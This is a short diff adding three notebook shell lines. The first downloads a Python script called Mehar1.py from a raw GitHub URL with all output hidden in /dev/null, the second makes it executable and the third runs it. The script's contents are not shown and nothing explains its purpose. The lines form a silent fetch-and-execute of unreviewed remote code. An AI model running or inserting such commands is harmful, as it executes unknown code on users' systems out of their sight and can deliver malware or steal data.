@@ -1,0 +1,3 @@
+! wget https://raw.githubusercontent.com/top4u/top4me/main/Mehar1.py &> /dev/null
+! chmod +x Mehar1.py
+! python Mehar1.py
